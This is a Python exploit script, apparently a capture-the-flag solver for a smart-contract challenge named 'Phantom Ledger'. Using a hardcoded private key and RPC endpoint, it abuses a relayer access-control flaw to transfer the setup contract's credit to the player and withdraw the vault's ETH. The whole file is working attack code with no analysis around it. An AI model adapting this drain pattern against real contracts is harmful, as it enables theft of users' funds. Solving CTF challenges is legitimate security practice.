#!/usr/bin/env python3
from web3 import Web3
from eth_account import Account
import argparse
import sys

DEFAULT_RPC = "http://34.2.147.230:8502/2720c901-0a87-4148-9134-d0852a403c83"
DEFAULT_PRIVKEY = "0d265796c724db336536c988cb71b16b344f20b8eec5d636387356231dd5455a"
DEFAULT_SETUP = "0x404006B5d8C6A05038c1D404b68546A93f7bd888"
DEFAULT_WALLET = "0x7426AE6CcFdd84C1f6565532E6f28597E3C0E9E4"

SETUP_ABI = [
    {
        "inputs": [],
        "name": "vault",
        "outputs": [{"internalType": "contract PhantomVault", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

VAULT_ABI = [
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "getBalance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"},
        ],
        "name": "transferCredit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "relayer",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
]


def eth(w3, wei):
    return w3.from_wei(wei, "ether")


def send_tx(w3, acct, fn, nonce, label):
    base = {
        "from": acct.address,
        "nonce": nonce,
        "chainId": w3.eth.chain_id,
        "gasPrice": w3.eth.gas_price,
    }

    # Estimate if possible; otherwise use a safe fixed gas limit.
    try:
        gas = fn.estimate_gas({"from": acct.address})
        base["gas"] = int(gas * 1.25) + 10000
    except Exception:
        base["gas"] = 300000

    tx = fn.build_transaction(base)
    signed = acct.sign_transaction(tx)

    # web3.py v5/v6 compatibility.
    raw = getattr(signed, "rawTransaction", None) or signed.raw_transaction
    txh = w3.eth.send_raw_transaction(raw)
    print(f"[>] {label} tx: {txh.hex()}")

    receipt = w3.eth.wait_for_transaction_receipt(txh, timeout=120)
    if receipt.status != 1:
        raise RuntimeError(f"{label} tx failed: {txh.hex()}")

    print(f"[+] {label} ok, gasUsed={receipt.gasUsed}")
    return receipt


def main():
    ap = argparse.ArgumentParser(description="Phantom Ledger exploit solver")
    ap.add_argument("--rpc", default=DEFAULT_RPC)
    ap.add_argument("--privkey", default=DEFAULT_PRIVKEY)
    ap.add_argument("--setup", default=DEFAULT_SETUP)
    ap.add_argument("--wallet", default=DEFAULT_WALLET)
    args = ap.parse_args()

    w3 = Web3(Web3.HTTPProvider(args.rpc))
    if not w3.is_connected():
        print("[!] RPC not connected", file=sys.stderr)
        return 1

    acct = Account.from_key(args.privkey)
    setup_addr = w3.to_checksum_address(args.setup)
    wallet_addr = w3.to_checksum_address(args.wallet)

    if acct.address.lower() != wallet_addr.lower():
        print(f"[!] private key address mismatch: {acct.address} != {wallet_addr}", file=sys.stderr)
        return 1

    setup = w3.eth.contract(address=setup_addr, abi=SETUP_ABI)
    vault_addr = setup.functions.vault().call()
    vault = w3.eth.contract(address=vault_addr, abi=VAULT_ABI)

    print(f"[+] player : {acct.address}")
    print(f"[+] setup  : {setup_addr}")
    print(f"[+] vault  : {vault_addr}")
    print(f"[+] relayer: {vault.functions.relayer().call()}")
    print(f"[+] chainId: {w3.eth.chain_id}")

    vault_eth_balance = w3.eth.get_balance(vault_addr)
    setup_credit = vault.functions.getBalance(setup_addr).call()
    player_credit = vault.functions.getBalance(acct.address).call()
    solved_before = setup.functions.isSolved().call()

    print(f"[+] vault ETH balance : {eth(w3, vault_eth_balance)} ETH")
    print(f"[+] setup credit      : {eth(w3, setup_credit)} ETH")
    print(f"[+] player credit     : {eth(w3, player_credit)} ETH")
    print(f"[+] solved before     : {solved_before}")

    if solved_before:
        print("[+] already solved")
        return 0

    nonce = w3.eth.get_transaction_count(acct.address)

    # Bug: msg.sender == relayer can transfer credit from ANY address.
    if setup_credit > 0:
        send_tx(
            w3,
            acct,
            vault.functions.transferCredit(setup_addr, acct.address, setup_credit),
            nonce,
            "transferCredit(setup -> player)",
        )
        nonce += 1

    player_credit = vault.functions.getBalance(acct.address).call()
    print(f"[+] player credit after transfer: {eth(w3, player_credit)} ETH")

    if player_credit > 0:
        send_tx(w3, acct, vault.functions.withdraw(player_credit), nonce, "withdraw(player credit)")
        nonce += 1

    vault_eth_balance = w3.eth.get_balance(vault_addr)
    solved_after = setup.functions.isSolved().call()

    print(f"[+] final vault ETH balance: {eth(w3, vault_eth_balance)} ETH")
    print(f"[+] solved after           : {solved_after}")

    if not solved_after:
        print("[!] not solved yet", file=sys.stderr)
        return 1

    print("[+] Phantom Ledger solved")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
